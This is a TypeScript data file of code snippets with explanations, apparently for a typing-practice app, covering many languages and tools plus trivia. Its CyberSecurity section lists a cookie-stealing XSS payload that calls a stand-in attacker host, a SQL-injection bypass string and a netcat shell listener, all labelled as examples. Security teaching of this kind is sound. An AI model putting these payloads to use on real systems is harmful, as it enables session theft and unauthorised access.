export interface SkillSnippet {
    text: string;
    explanation: string;
}

const p = (text: string, explanation: string) => ({ text, explanation });

export const SKILL_DATA: Record<string, SkillSnippet[]> = {
    "Python": [
        p("x = [i**2 for i in range(10) if i % 2 == 0]", "List comprehension with conditional filtering."),
        p("def decorator(func):\n    def wrapper():\n        print('Start')\n        func()\n        print('End')\n    return wrapper", "Higher-order function (Decorator) pattern."),
        p("with open('data.csv', 'r') as file:\n    content = file.read()", "Safe file handling using Context Managers."),
        p("class NeuralNode(BaseNode):\n    def __init__(self, value):\n        super().__init__(value)\n        self.activated = False", "Object-Oriented Programming: Inheritance and super()."),
        p("import asyncio\nasync def fetch_data():\n    await asyncio.sleep(1)\n    return {'data': 1}", "Asynchronous programming with async/await."),
        p("try:\n    result = 10 / 0\nexcept ZeroDivisionError as e:\n    print(f'Error: {e}')", "Exception handling for robust code."),
        p("data = {'id': 1, 'val': 10}\nprint(f\"Node {data['id']} value: {data['val']}\")", "Modern string interpolation using F-strings."),
        p("nums = [1, 2, 3]\nmapped = list(map(lambda x: x * 2, nums))", "Functional programming: map and lambda functions."),
        p("import pandas as pd\ndf = pd.read_json('api_response.json')", "Data analysis: Reading JSON into a DataFrame."),
        p("@property\ndef radius(self):\n    return self._radius", "Encapsulation using the @property decorator.")
    ],
    "React": [
        p("const [count, setCount] = useState(0);", "State management with the useState hook."),
        p("useEffect(() => {\n    const timer = setInterval(() => tick(), 1000);\n    return () => clearInterval(timer);\n}, []);", "Lifecycle management and cleanup with useEffect."),
        p("const memoizedValue = useMemo(() => compute(a, b), [a, b]);", "Performance optimization using useMemo."),
        p("const ThemeContext = createContext('dark');", "Cross-component state sharing with Context API."),
        p("export const App = ({ title }) => <h1>{title}</h1>;", "Functional component with destructuring props."),
        p("const inputRef = useRef(null);\nconst focusInput = () => inputRef.current.focus();", "Direct DOM access using the useRef hook."),
        p("const [state, dispatch] = useReducer(reducer, initialState);", "Complex state logic handling with useReducer."),
        p("<Suspense fallback={<Loader />}>\n    <LazyComponent />\n</Suspense>", "Code splitting and lazy loading with Suspense."),
        p("const { data, error } = useSWR('/api/user', fetcher);", "Data fetching patterns in modern React."),
        p("return (\n    <div onClick={() => setToggle(!toggle)}>\n        {toggle ? 'Active' : 'Inactive'}\n    </div>\n);", "Conditional rendering and event handling.")
    ],
    "SQL": [
        p("SELECT name, count(*) FROM users GROUP BY name HAVING count(*) > 1;", "Aggregation with GROUP BY and HAVING filters."),
        p("SELECT u.name, p.title FROM users u JOIN posts p ON u.id = p.user_id;", "Relational data retrieval using Inner Joins."),
        p("INSERT INTO sessions (user_id, login_time) VALUES (101, NOW());", "Adding new records with timestamp functions."),
        p("UPDATE employees SET salary = salary * 1.1 WHERE performance > 8;", "Bulk updates with conditional logic."),
        p("CREATE INDEX idx_user_email ON users(email);", "Database optimization: Creating an Index."),
        p("DELETE FROM logs WHERE created_at < '2023-01-01';", "Data maintenance: Deleting stale records."),
        p("SELECT * FROM products WHERE price BETWEEN 10 AND 50 ORDER BY price DESC;", "Range filtering and descending sort."),
        p("BEGIN TRANSACTION;\nUPDATE account SET bal = bal - 100;\nCOMMIT;", "ACID compliance: Atomic transactions."),
        p("SELECT COALESCE(phone, 'No Phone') FROM contacts;", "Handling NULL values with COALESCE."),
        p("ALTER TABLE users ADD COLUMN bio TEXT;", "Schema evolution: Modifying existing tables.")
    ],
    "TypeScript": [
        p("interface User {\n    id: number;\n    name: string;\n    email?: string;\n}", "Defining structures with Interfaces and optional fields."),
        p("type Status = 'pending' | 'active' | 'archived';", "Type safety using Union types."),
        p("function getIdentity<T>(arg: T): T {\n    return arg;\n}", "Reusable code with Generics."),
        p("enum Direction { Up = 1, Down, Left, Right }", "Self-documenting code with Enums."),
        p("const input = document.getElementById('main') as HTMLInputElement;", "Type Casting / Assertions for DOM elements."),
        p("type PartialUser = Partial<User>;", "Utility types: Making all properties optional."),
        p("readonly id: string = '001';", "Immutability with the readonly modifier."),
        p("function isString(val: any): val is string {\n    return typeof val === 'string';\n}", "Type Guards for runtime safety."),
        p("abstract class Shape {\n    abstract getArea(): number;\n}", "Abstract classes for architectural patterns."),
        p("type Point = { x: number; y: number };", "Defining shape with Type Aliases.")
    ],
    "Java": [
        p("public class Main {\n    public static void main(String[] args) {\n        System.out.println(\"Hello World\");\n    }\n}", "The standard Java application entry point."),
        p("List<String> list = new ArrayList<>();\nlist.add(\"Neuro-Type\");", "Collections Framework: ArrayList usage."),
        p("try (BufferedReader br = new BufferedReader(new FileReader(path))) {\n    return br.readLine();\n}", "Try-with-resources for automatic cleanup."),
        p("public interface Drawable {\n    void draw();\n}", "Defining contracts using Interfaces."),
        p("@Override\npublic String toString() {\n    return \"Node[id=\" + id + \"]\";\n}", "Annotation for method overriding."),
        p("CompletableFuture.supplyAsync(() -> fetchData())\n    .thenAccept(data -> process(data));", "Asynchronous programming with CompletableFuture."),
        p("Map<String, Integer> map = new HashMap<>();\nmap.put(\"key\", 100);", "Key-value storage using HashMap."),
        p("public final class Constants {\n    public static final double PI = 3.14159;\n}", "Final classes and static constants."),
        p("Stream.of(\"a\", \"b\", \"c\").map(String::toUpperCase).forEach(System.out::println);", "Functional streams added in Java 8."),
        p("synchronized(lock) {\n    counter++;\n}", "Thread safety using synchronized blocks.")
    ],
    "HTML/CSS": [
        p("<meta name='viewport' content='width=device-width, initial-scale=1.0'>", "Responsive design: Viewport meta tag."),
        p(".container {\n    display: flex;\n    justify-content: center;\n    align-items: center;\n}", "Layout: Centering items with Flexbox."),
        p("@media screen and (max-width: 600px) {\n    .sidebar { display: none; }\n}", "Responsive breakpoints with Media Queries."),
        p(".grid {\n    display: grid;\n    grid-template-columns: repeat(3, 1fr);\n}", "Advanced layout using CSS Grid."),
        p("box-sizing: border-box;", "Standardizing the CSS box model."),
        p(".btn {\n    transition: background 0.3s ease-in-out;\n}\n.btn:hover { background: #00f3ff; }", "Smooth UI interactions with Transitions."),
        p("<picture>\n    <source srcset='img.webp' type='image/webp'>\n    <img src='img.jpg' alt='Adaptive'>\n</picture>", "Modern adaptive image loading."),
        p("position: sticky; top: 0;", "Keeping elements in view during scroll."),
        p("z-index: 100; pointer-events: none;", "Layering and input transparency."),
        p("filter: blur(10px) brightness(0.8);", "Visual post-processing with CSS Filters.")
    ],
    "C++": [
        p("#include <iostream>\nint main() {\n    std::cout << \"Ready\" << std::endl;\n    return 0;\n}", "Standard I/O and entry point."),
        p("std::vector<int> vec = {1, 2, 3};\nvec.push_back(4);", "Dynamic arrays using the Standard Template Library."),
        p("int* ptr = new int(10);\ndelete ptr;", "Manual memory management with pointers."),
        p("template <typename T>\nT add(T a, T b) { return a + b; }", "Generic programming with C++ Templates."),
        p("class User {\npublic:\n    User(std::string n) : name(n) {}\nprivate:\n    std::string name;\n};", "Constructors and access modifiers."),
        p("auto lambda = [](int x) { return x * x; };", "Modern C++ lambdas (C++11 and later)."),
        p("std::unique_ptr<Node> node = std::make_unique<Node>();", "Smart pointers for safe memory management."),
        p("for (const auto& item : items) {\n    process(item);\n}", "Range-based for loops."),
        p("namespace fs = std::filesystem;", "Namespace aliasing for cleaner code."),
        p("try { throw std::runtime_error(\"Fail\"); }\ncatch (const std::exception& e) {}", "Error handling with try/catch blocks.")
    ],
    "Rust": [
        p("fn main() {\n    println!(\"Hello Neuro-Type!\");\n}", "Macros and entry point in Rust."),
        p("let mut x = 5;\nx = 6;", "Explicit mutability with the mut keyword."),
        p("match result {\n    Ok(val) => println!(\"{}\", val),\n    Err(e) => eprintln!(\"{}\", e),\n}", "Pattern matching for robust error handling."),
        p("let v = vec![1, 2, 3];", "Heap-allocated dynamic arrays (Vectors)."),
        p("struct User {\n    username: String,\n    active: bool,\n}", "Defining structures."),
        p("impl User {\n    fn new(name: String) -> Self {\n        Self { username: name, active: true }\n    }\n}", "Implementing methods for structs."),
        p("pub fn compute<T: Display>(arg: T) { }", "Generics and trait bounds."),
        p("let s1 = String::from(\"hello\");\nlet s2 = s1; // s1 is moved", "Rust's core concept: Ownership and Move semantics."),
        p("use std::collections::HashMap;", "Importing from the standard library."),
        p("async fn fetch() -> Result<(), Error> { }", "Asynchronous functions in Rust.")
    ],
    "Go": [
        p("package main\nimport \"fmt\"\nfunc main() {\n    fmt.Println(\"Go!\")\n}", "Minimal Go program structure."),
        p("func compute(a, b int) (int, error) {\n    return a + b, nil\n}", "Multiple return values and error handling."),
        p("go func() {\n    fmt.Println(\"Concurrent\")\n}()", "Lightweight concurrency with Goroutines."),
        p("ch := make(chan string)\nch <- \"data\"", "Communicating between routines using Channels."),
        p("type User struct {\n    ID   int\n    Name string\n}", "Defining types with Structs."),
        p("slice := []int{1, 2, 3}\nslice = append(slice, 4)", "Dynamic arrays (Slices) in Go."),
        p("if err := doSomething(); err != nil {\n    return err\n}", "Idiomatic error checking."),
        p("defer file.Close()", "Ensuring cleanup with defer."),
        p("m := make(map[string]int)\nm[\"score\"] = 42", "Built-in hash maps."),
        p("interface {\n    Read(p []byte) (n int, err error)\n}", "Implicit interfaces for flexible design.")
    ],
    "Node.js": [
        p("const fs = require('fs').promises;\nasync function read() {\n    const data = await fs.readFile('config.json');\n}", "Asynchronous file I/O with promises."),
        p("const server = http.createServer((req, res) => {\n    res.end('Hello');\n});", "Building a low-level HTTP server."),
        p("process.on('uncaughtException', (err) => {\n    console.error(err);\n});", "Global error handling in the Node process."),
        p("module.exports = { data: 'secret' };", "Exporting modules in CommonJS."),
        p("const path = require('path');\nconst fullPath = path.join(__dirname, 'public');", "Safe path manipulation."),
        p("const emitter = new EventEmitter();\nemitter.on('start', () => console.log('Started'));", "Event-driven architecture with EventEmitter."),
        p("const buffer = Buffer.from('Neuro-Type', 'utf-8');", "Handling binary data with Buffers."),
        p("app.use((req, res, next) => {\n    console.log(req.url);\n    next();\n});", "Middleware pattern in Express.js."),
        p("const cluster = require('cluster');\nif (cluster.isMaster) cluster.fork();", "Scaling Node apps with the Cluster module."),
        p("process.env.NODE_ENV = 'production';", "Accessing and setting environment variables.")
    ],
    "Linux Bash": [
        p("grep -r \"Neural\" ./src | wc -l", "Searching and counting occurrences recursively."),
        p("chmod +x script.sh && ./script.sh", "Setting permissions and executing."),
        p("find . -name \"*.ts\" -mtime -1", "Finding files modified in the last 24 hours."),
        p("tar -czvf archive.tar.gz ./data", "Compressing directories into tarballs."),
        p("curl -X POST -d '{\"id\":1}' http://api.link", "Testing APIs via the command line."),
        p("alias gs='git status'", "Creating command shortcuts."),
        p("echo \"PATH=$PATH:/new/bin\" >> ~/.bashrc", "Updating the system PATH."),
        p("ssh user@remote-host -p 22", "Secure remote server access."),
        p("df -h && free -m", "Checking disk space and memory usage."),
        p("kill -9 $(lsof -t -i:3000)", "Forcefully stopping processes on a specific port.")
    ],
    "Docker": [
        p("FROM node:18-alpine\nWORKDIR /app\nCOPY . .", "Defining a base image and working directory."),
        p("RUN npm install --production", "Build-time commands in a Dockerfile."),
        p("CMD [\"npm\", \"start\"]", "Default execution command for a container."),
        p("docker build -t neuro-app .", "Building a Docker image from a context."),
        p("docker run -p 3000:3000 -d neuro-app", "Running a container in detached mode with port mapping."),
        p("docker-compose up -d", "Orchestrating multi-container apps."),
        p("docker exec -it container_id /bin/sh", "Accessing a running container's shell."),
        p("docker volume create pg_data", "Persisting data using Docker Volumes."),
        p("ENV PORT=8080", "Setting environment variables in a Dockerfile."),
        p("docker ps -a", "Listing all containers, including stopped ones.")
    ],
    "Git": [
        p("git checkout -b feature/neural-link", "Creating and switching to a new branch."),
        p("git add . && git commit -m \"feat: add AI tracker\"", "Staging and committing changes."),
        p("git pull origin main --rebase", "Updating local branch without merge commits."),
        p("git push -u origin head", "Pushing current branch to remote upstream."),
        p("git merge --no-ff develop", "Merging with a commit even if fast-forward is possible."),
        p("git stash && git stash pop", "Temporarily saving and restoring uncommitted work."),
        p("git log --graph --oneline --all", "Visualizing commit history in the terminal."),
        p("git reset --hard HEAD~1", "Discarding the last commit and all its changes."),
        p("git cherry-pick a1b2c3d", "Applying a specific commit from another branch."),
        p("git remote add origin https://github.com/...", "Linking a local repo to a remote server.")
    ],
    "CyberSecurity": [
        p("<script>fetch('http://atk.com?c='+document.cookie)</script>", "Cross-Site Scripting (XSS) payload example."),
        p("' OR '1'='1", "Classic SQL Injection authentication bypass."),
        p("bcrypt.hash(password, saltRounds)", "Secure password storage using hashing."),
        p("nmap -sV -p 1-1000 target.com", "Service version detection and port scanning."),
        p("Header set Content-Security-Policy \"default-src 'self'\"", "Hardening web apps with CSP headers."),
        p("openssl genrsa -out private.key 2048", "Generating RSA keys for encryption."),
        p("JWT_SECRET = process.env.JWT_SECRET", "Using environment variables for sensitive keys."),
        p("nc -lvp 4444 -e /bin/bash", "Setting up a reverse shell listener (Educational)."),
        p("iptables -A INPUT -p tcp --dport 22 -j DROP", "Network security: Blocking SSH access."),
        p("grep \"404\" /var/log/apache2/access.log", "Incident response: Analyzing logs for probes.")
    ],
    "Machine Learning": [
        p("model.fit(X_train, y_train, epochs=10)", "Training a model on a dataset."),
        p("from sklearn.model_selection import train_test_split", "Splitting data into training and testing sets."),
        p("Dense(128, activation='relu')", "Defining a fully connected layer with ReLU."),
        p("optimizer = Adam(learning_rate=0.001)", "Configuring the Adam optimizer."),
        p("loss = 'categorical_crossentropy'", "Defining the loss function for multi-class classification."),
        p("precision = true_pos / (true_pos + false_pos)", "Calculating model performance metrics."),
        p("import tensorflow as tf", "Importing the TensorFlow deep learning library."),
        p("pca = PCA(n_components=2)\nX_reduced = pca.fit_transform(X)", "Dimensionality reduction using PCA."),
        p("model.save('neural_model.h5')", "Persisting a trained model to disk."),
        p("data.fillna(data.mean(), inplace=True)", "Preprocessing: Handling missing values.")
    ],
    "Data Science": [
        p("df.describe()", "Generating summary statistics for a DataFrame."),
        p("df.groupby('category')['sales'].sum()", "Aggregating data by categories."),
        p("import matplotlib.pyplot as plt\nplt.plot(x, y)", "Basic data visualization with Matplotlib."),
        p("sns.heatmap(df.corr(), annot=True)", "Visualizing feature correlations with Seaborn."),
        p("pd.pivot_table(df, values='D', index=['A', 'B'])", "Creating complex data summaries."),
        p("scaler = StandardScaler()\nX_scaled = scaler.fit_transform(X)", "Normalizing features for better model performance."),
        p("df['new_col'] = df['old_col'].apply(lambda x: x*2)", "Feature engineering: Transforming columns."),
        p("from scipy import stats\nz_score = stats.zscore(data)", "Statistical analysis: Calculating Z-scores."),
        p("df.sort_values(by='date', ascending=False)", "Organizing data chronologically."),
        p("pd.read_sql_query('SELECT * FROM data', engine)", "Integrating SQL queries with Python Data Science.")
    ],
    "Regex": [
        p("/^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\\.[a-zA-Z]{2,}$/", "A common regex for email validation."),
        p("/\\d{3}-\\d{3}-\\d{4}/", "Matching North American phone number patterns."),
        p("/https?:\\/\\/(www\\.)?[-a-zA-Z0-9@:%._\\+~#=]{1,256}/", "Regex for identifying URLs."),
        p("/(?=.*[A-Z])(?=.*[a-z])(?=.*\\d).{8,}/", "Password strength: 8 chars, 1 upper, 1 lower, 1 digit."),
        p("/\\s+/", "Matching one or more whitespace characters."),
        p("/<[^>]*>/g", "Stripping HTML tags from a string."),
        p("/(abc|def)/", "Matching either 'abc' or 'def' (Alternation)."),
        p("/\\bword\\b/i", "Case-insensitive word boundary match."),
        p("/(\\d)\\1+/", "Matching repeated digits using backreferences."),
        p("/(?<=@)\\w+/", "Lookbehind: Matching text following an '@'.")
    ],
    "Quantum Computing": [
        p("circuit.h(0)\ncircuit.cx(0, 1)", "Creating a Bell State (Entanglement) in Qiskit."),
        p("result = execute(circuit, backend).result()", "Executing a quantum circuit on a simulator."),
        p("qc.measure_all()", "Collapsing quantum states into classical bits."),
        p("Qubit 0 is in superposition of |0> and |1>", "The fundamental principle of quantum bits."),
        p("Quantum Gates: Pauli-X, Hadamard, CNOT", "Building blocks of quantum algorithms."),
        p("Shor's Algorithm for prime factorization", "The quantum algorithm that threatens RSA."),
        p("Bloch Sphere visualization of a qubit state", "Representing qubits in a 3D coordinate system."),
        p("Quantum Decoherence: Loss of quantum info", "The main challenge in building stable hardware."),
        p("Cryogenic cooling to near absolute zero", "Standard environment for superconducting qubits."),
        p("Quantum Supremacy: Solving 10k year tasks in seconds", "Milestones in quantum computational power.")
    ],
    "Astronomy": [
        p("c = 299792458 m/s", "The speed of light in a vacuum."),
        p("Light travels 9.46 trillion km in a year.", "Definition of a Light Year."),
        p("Singularity: The core of a Black Hole.", "Infinite density and zero volume."),
        p("The Milky Way is 100,000 light years wide.", "The scale of our home galaxy."),
        p("Event Horizon: The point of no return.", "Boundary around a black hole."),
        p("Andromeda: Our nearest neighbor galaxy.", "On a collision course with the Milky Way."),
        p("The Sun's core temperature is 15 million °C.", "The engine of our solar system."),
        p("Supernova: The explosive death of a star.", "Creating heavy elements like gold."),
        p("Exoplanets: Planets orbiting other stars.", "Searching for Earth-like worlds."),
        p("Hubble Constant: The rate of cosmic expansion.", "Measuring the age of the universe.")
    ],
    "Tech Trivia": [
        p("First computer bug: A real moth in a relay.", "Origin of the term 'Debugging'."),
        p("The QWERTY layout was to prevent jams.", "History of the modern keyboard."),
        p("Bluetooth is named after a Viking King.", "Harald 'Bluetooth' Gormsson."),
        p("Python was named after Monty Python.", "Not the snake."),
        p("The first domain name: symbolics.com", "Registered in March 1985."),
        p("1024 GB = 1 Terabyte", "Binary storage units."),
        p("The 'Save' icon is a 3.5-inch floppy disk.", "A legacy symbol for modern users."),
        p("ASCII: American Standard Code for Info Interchange", "Original 7-bit character encoding."),
        p("The first mouse was made of wood.", "Invented by Douglas Engelbart."),
        p("Vim vs Emacs: The great editor war.", "A classic community debate.")
    ]
};

export function parseCustomData(rawData: string): SkillSnippet[] {
    const lines = rawData.split('\n').filter(line => line.trim().length > 0);
    const snippets: SkillSnippet[] = [];
    for (let i = 0; i < lines.length; i += 2) {
        let text = lines[i];
        if (i + 1 < lines.length) text += '\n' + lines[i+1];
        snippets.push({ text: text.trimEnd(), explanation: "Custom Input Acquired." });
    }
    if(snippets.length === 0) snippets.push({ text: "Error", explanation: "Empty." });
    return snippets;
}
